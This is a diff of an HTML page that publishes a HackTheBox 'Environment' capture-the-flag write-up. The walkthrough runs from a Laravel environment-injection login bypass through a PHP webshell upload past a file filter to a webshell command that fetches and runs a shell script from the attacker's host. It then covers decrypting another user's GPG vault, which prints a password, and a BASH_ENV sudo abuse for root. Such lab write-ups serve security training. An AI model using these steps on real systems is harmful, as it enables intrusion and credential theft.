@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Environment - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Environment.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Environment machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Environment machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Environment, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,150 @@
         <h1 class="writeup-title">Environment</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">September 6, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Environment" src="../images/Environment/pwned.png" /></p>
-<p>Environment is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Environment retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Environment/pwned.png" /></p>
+<p>Environment was a medium-difficulty Linux box that began with an environment variable injection vulnerability (CVE-2024-52301) in a Laravel PHP web application.
+By injecting an --env=preprod argument into a POST request to the login form, authentication was bypassed, granting access to a user dashboard.
+From there, a restrictive file upload filter was circumvented by combining a GIF89A magic byte header with a trailing-dot filename (shell.php.), allowing the upload of a PHP webshell and achieving initial remote code execution as the www-data user.</p>
+<p>Post-exploitation enumeration revealed a GPG-encrypted keyvault in another user's home directory. By copying the user's .gnupg directory and leveraging the GNUPGHOME environment variable, the vault was decrypted to expose plaintext SSH credentials for the user hish, enabling lateral movement.</p>
+<p>Privilege escalation to root was then achieved by exploiting a custom system information script. The env-keep+=BASH ENV directive was abused by setting the BASH_ENV variable to a file containing a reverse shell payload.
+When the privileged script was executed, its bash interpreter sourced the malicious file before running its own code, granting a shell as the root user and completing the exploitation chain.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Environment/nmap.png" /></p>
+<p>Initial nmap scan reveals just 2 open ports. SSH and a website.</p>
+<p>I will start off by taking a look at the website.</p>
+<h2>Website enumeration</h2>
+<p><img alt="website" src="../images/Environment/website.png" /></p>
+<p>There was nothing interesting on the main site, so I'll run ffuf to search for endpoints.</p>
+<p><code>ffuf -u http://environment.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -fs 153</code></p>
+<p><img alt="ffuf" src="../images/Environment/ffuf.png" /></p>
+<p>Up and login endpoints return a positive status code. I'll check both of them before moving to the others.</p>
+<p><img alt="up" src="../images/Environment/up.png" /></p>
+<p>Up is just a website status endpoint. But it also reveals that the website is using Laravel as its framework, and at the same time, that the website is PHP-based.</p>
+<p><img alt="laravel" src="../images/Environment/laravel.png" /></p>
+<p>Login contains a login form, which won't be too useful without valid credentials.</p>
+<p><img alt="login" src="../images/Environment/login.png" /></p>
+<p>Since I know that the website uses Laravel, I'll try to crash it. This way I might be able to get valuable information like the framework's version, code snippets, depending on how Laravel is configured.</p>
+<h2>Crashing the login form</h2>
+<p>One way of intentionally crashing the website is to input malformed data in forms. For example, since there is a remember me box, if I capture the request with burpsuite and change the value from True/False to anything else, the website will crash.</p>
+<p><img alt="crash" src="../images/Environment/crash.png" /></p>
+<p>This worked as intended. The crash page reveals a bunch of useful things, starting with both the PHP version <code>8.2.28</code> and the Laravel version <code>11.30.0</code></p>
+<p>The code snippet itself contains a very interesting comment as well.</p>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">App</span><span class="o">::</span><span class="n">environment</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;preprod&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//QOL: login directly as me in dev/local/preprod envs</span>
+<span class="w">        </span><span class="n">$request</span><span class="o">-&gt;</span><span class="n">session</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">regenerate</span><span class="p">();</span>
+<span class="w">        </span><span class="n">$request</span><span class="o">-&gt;</span><span class="n">session</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">put</span><span class="p">(&#39;</span><span class="n">user_id</span><span class="p">&#39;,</span><span class="w"> </span><span class="mh">1</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">redirect</span><span class="p">(&#39;</span><span class="o">/</span><span class="n">management</span><span class="o">/</span><span class="n">dashboard</span><span class="p">&#39;);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>If I'm somehow able to set the website's environment to <code>preprod</code>, I will be able to pass the authentication process without knowing any credentials.</p>
+<p>This might become useful later. Since I have the Laravel version, I'll search the web for any CVEs that I could use.</p>
+<p>The search has led me to CVE-2024-52301.</p>
+<p><code>https://nvd.nist.gov/vuln/detail/CVE-2024-52301</code></p>
+<p><code>https://github.com/Nyamort/CVE-2024-52301</code></p>
+<p>I can change the website's environment with a single argument appended to my URL. I'll test this out on the main page.</p>
+<p><code>http://environment.htb/?--env=test</code></p>
+<p><img alt="footer" src="../images/Environment/footer.png" /></p>
+<p>The value changed from production to test, confirming the vulnerability.</p>
+<h2>Changing the environment to log in as the dev</h2>
+<p>Back on the login page, I will enter random credentials, and I'll capture the request with burpsuite.</p>
+<p><img alt="env" src="../images/Environment/env.png" /></p>
+<p>After sending the request, I was redirected  to the management dashboard.</p>
+<p><img alt="dashboard" src="../images/Environment/dashboard.png" /></p>
+<p><img alt="dashboardman" src="../images/Environment/dashboardman.png" /></p>
+<h2>Getting a shell on the box</h2>
+<p>The only thing I can really do through the dashboard is change my user's profile picture.</p>
+<p><img alt="pfp" src="../images/Environment/pfp.png" /></p>
+<p>Since this is a PHP website, I will try uploading a simple PHP webshell.</p>
+<p><img alt="fail" src="../images/Environment/fail.png" /></p>
+<p>As expected, this will fail. Most likely, the website will accept only image files. To test this, I will try uploading a random .png image next.</p>
+<p><img alt="upload" src="../images/Environment/upload.png" /></p>
+<p>And this worked. The challenge here will be fooling the filter so that I can upload my malicious webshell.</p>
+<p>I tried changing the content type to image/png, as well as the file extension, without much success.</p>
+<p>After that, I'll try tricking the filter by using a fake file header in my file contents. One that I know often works is the GIF header(GIF89A). I'll put it right below the content type header.</p>
+<p><img alt="chanfe" src="../images/Environment/chanfe.png" /></p>
+<p>However, this <em>still</em> returns an invalid filetype error. I'll try combining this with a changed extension, as the filter might be blocking the plain .php extension.</p>
+<p>After testing multiple extensions, adding a <code>.</code> at the end of the filename <code>shell.php.</code> worked, bypassing the filter and allowing me to upload the webshell.</p>
+<p><img alt="work" src="../images/Environment/work.png" /></p>
+<p>Afterwards, I am redirected to the file. The GIF header will be treated as harmless text by the PHP engine and will be displayed on the site, while it'll process the malicious code inside my file as normal.</p>
+<p><code>http://environment.htb/storage/files/shelly.php?0=whoami</code></p>
+<p><img alt="command" src="../images/Environment/command.png" /></p>
+<p>I tested whether the box could reach me to make sure that there won't be any blockades.</p>
+<p><code>http://environment.htb/storage/files/shelly.php?0=ping+-c+1+10.10.16.8</code></p>
+<p><img alt="tcpdump" src="../images/Environment/tcpdump.png" /></p>
+<p>The ping successfully reached my box. I can now proceed with getting a shell on the machine.</p>
+<p><code>http://environment.htb/storage/files/shelly.php?0=curl+http://10.10.16.8:8000/shell.sh|bash</code></p>
+<p>I started both a python server and an nc listener. As soon as I sent the URL, there was a hit on my server, and a while later, on my listener.</p>
+<p><img alt="shell" src="../images/Environment/shell.png" /></p>
+<h2>Owning the Hish user</h2>
+<p>Surprisingly, I can look into Hish's folder as the www-data user.</p>
+<p><img alt="hish" src="../images/Environment/hish.png" /></p>
+<p>In the backup folder, there is a GPG keyvault.</p>
+<p><img alt="backup" src="../images/Environment/backup.png" /></p>
+<h3>Decrypting the GPG keyvault</h3>
+<p>I cannot do anything with it, unless I get my hands on Hish's .gnupg directory. Since I can view the directory, I'll try to copy it whole into <code>/tmp/hishhome</code></p>
+<p><code>cp -r hish /tmp/hishhome</code></p>
+<p><img alt="copy" src="../images/Environment/copy.png" /></p>
+<p>This worked. Now I have a perfect copy of Hish's .gnupg directory, which will allow me to decrypt the keyvault.</p>
+<p>By specifying the copied .gnupg directory as the <code>GNUPGHOME</code> environmental variable, I'll be able to use the secret keys stored within and decrypt Hish's encrypted files, like the keyvault.</p>
+<p><code>GNUPGHOME=/tmp/hishhome/.gnupg gpg --decrypt backup/keyvault.gpg</code></p>
+<p><img alt="decrypt" src="../images/Environment/decrypt.png" /></p>
+<p>There are 3 passwords inside, and it looks like one of them is for the box itself.</p>
+<p><code>Hish | marineSPm@ster!!</code></p>
+<p>I'll try to SSH as Hish with these credentials.</p>
+<p><img alt="user" src="../images/Environment/user.png" /></p>
+<h1>Root flag</h1>
+<p><img alt="sudol" src="../images/Environment/sudol.png" /></p>
+<p>User Hish can run a custom systeminfo script. Aside from that, there is one more interesting thing that I'll come back to later.</p>
+<h2>Trying to exploit the systeminfo script with PATH injection</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># systeminfo</span>
+
+<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">### Displaying kernel ring buffer logs (dmesg) ###&quot;</span>
+<span class="n">dmesg</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">tail</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="mi">10</span>
+
+<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">### Checking system-wide open ports ###&quot;</span>
+<span class="n">ss</span><span class="w"> </span><span class="o">-</span><span class="n">antlp</span>
+
+<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">### Displaying information about all mounted filesystems ###&quot;</span>
+<span class="n">mount</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">column</span><span class="w"> </span><span class="o">-</span><span class="n">t</span>
+
+<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">### Checking system resource limits ###&quot;</span>
+<span class="n">ulimit</span><span class="w"> </span><span class="o">-</span><span class="n">a</span>
+
+<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">### Displaying loaded kernel modules ###&quot;</span>
+<span class="n">lsmod</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">head</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="mi">10</span>
+
+<span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">### Checking disk usage for all filesystems ###&quot;</span>
+<span class="n">df</span><span class="w"> </span><span class="o">-</span><span class="n">h</span>
+</code></pre></div>
+
+<p>It's a simple system information script that displays results from 6 different commands. I can see that the script is not using full paths to the binaries, which I could abuse by modifying the PATH variable.</p>
+<p>Currently, the PATH variable is set to <code>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</code>. This means that the script will first look into /usr/local/bin for these binaries, then into /usr/bin, and so on.</p>
+<p>Obviously, I cannot write into /usr/bin as Hish, but I can modify the PATH variable to make the script look into user-controlled directories for these files before the regular ones. Then I could plant a malicious script/bin in that folder, and the script will navigate to that one instead.</p>
+<p><code>export PATH=/tmp:$PATH</code></p>
+<p><img alt="path" src="../images/Environment/path.png" /></p>
+<p>I created a script named <code>df</code> in the /tmp directory, containing a bash reverse shell. In theory, this should now give me a shell each time I run the systemingo script. I used <code>chmod</code> to make the df script executable, and ran the script.</p>
+<p><img alt="hang" src="../images/Environment/hang.png" /></p>
+<p>It hung up after trying to use df.</p>
+<p><img alt="shell1" src="../images/Environment/shell1.png" /></p>
+<p>And returned a shell as Hish, which confirms that this works for <em>Hish</em>.</p>
+<p><img alt="dfwork" src="../images/Environment/dfwork.png" /></p>
+<p>This won't work for root, however, and it's because root has its own PATH variable, which cannot be changed. It looks for binaries in a special <code>/usr/sbin</code> directory, which contains the necessary tools and more that regular users should not have access to.</p>
+<p>It can actually be seen in the <code>sudo -l</code> output. The <code>secure_path</code> variable is what root uses instead of the normal PATH variable.</p>
+<h2>Abusing the BASH_ENV env variable for root shell</h2>
+<p>There was one more thing that the <code>sudo -l</code> command revealed, which will most likely lead to root code execution.</p>
+<p><img alt="envkeep" src="../images/Environment/envkeep.png" /></p>
+<p>Normally, all of the environmental variables are reset when sudo is used. Here, the BASH_ENV variable will be kept and passed along.</p>
+<p>This means that I can change the environment in which bash will operate, and in short, make it execute commands by specifying my df file as the <code>BASH_ENV</code> variable.</p>
+<p><code>BASH_ENV=df sudo /usr/bin/systeminfo</code></p>
+<p>The script hung up without even running, and on my listener, a root shell was caught.</p>
+<p><img alt="root" src="../images/Environment/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
